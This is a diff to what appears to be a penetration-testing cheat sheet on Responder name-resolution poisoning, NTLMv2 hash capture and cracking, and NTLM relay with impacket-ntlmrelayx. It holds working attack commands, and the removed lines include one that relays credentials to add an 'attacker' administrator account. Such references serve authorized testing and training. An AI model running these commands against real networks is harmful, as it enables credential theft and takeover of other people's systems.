@@ -1,7 +1,7 @@
 # Responder – LLMNR/NBT-NS/MDNS Poisoning & Credential Capture
 
 !!! tip "Tip"
-    Run `sudo responder -I tun0 -wrf` as soon as you have internal network access — it passively captures NTLMv2 hashes from any misconfigured name resolution. Crack with `hashcat -m 5600`. If SMB signing is disabled on targets, relay with `ntlmrelayx` instead of cracking.
+    Run `sudo responder -I tun0 -wrf` as soon as you have internal network access — it passively captures NTLMv2 hashes from any misconfigured name resolution. Crack with `hashcat -m 5600`. If SMB signing is disabled on targets, relay with `impacket-ntlmrelayx` instead of cracking.
 
 ---
 
@@ -44,7 +44,7 @@ Responder/logs/10.10.10.10-SMB-NTLMv2-<timestamp>.txt
 USERNAME::DOMAIN:LMHASH:NTHASH:CHALLENGE:RESPONSE
 ```
 
-Captured hashes can be cracked offline, relayed via `ntlmrelayx`, or injected with tools like `pth-winexe`, `pth-smbclient`.
+Captured hashes can be cracked offline, relayed via `impacket-ntlmrelayx`, or injected with tools like `pth-winexe`, `pth-smbclient`.
 
 ---
 
@@ -70,7 +70,7 @@ cut -d ' ' -f 3 responder.log > responder_hashes.txt
 
 ---
 
-## NTLM Relay Attacks (ntlmrelayx)
+## NTLM Relay Attacks (impacket-ntlmrelayx)
 
 ### Disable SMB in Responder to Avoid Collision
 
@@ -78,10 +78,10 @@ cut -d ' ' -f 3 responder.log > responder_hashes.txt
 sudo responder -I tun0 -wrf --disable-smb
 ```
 
-### Start ntlmrelayx
+### Start impacket-ntlmrelayx
 
 ```bash
-sudo ntlmrelayx.py -tf targets.txt -smb2support
+sudo impacket-ntlmrelayx -tf targets.txt -smb2support
 ```
 
 #### Example `targets.txt`:
@@ -91,10 +91,10 @@ smb://192.168.1.10
 ldap://192.168.1.20
 ```
 
-### Relay to SMB, Add Admin User
+### Relay to SMB, Run a Command
 
 ```bash
-sudo ntlmrelayx.py -tf targets.txt --no-smb-signing --add-user attacker --passwd 'P@ssw0rd123' --group 'Administrators'
+sudo impacket-ntlmrelayx -tf targets.txt -smb2support -c 'whoami'
 ```
 
 #### Supported Relay Targets
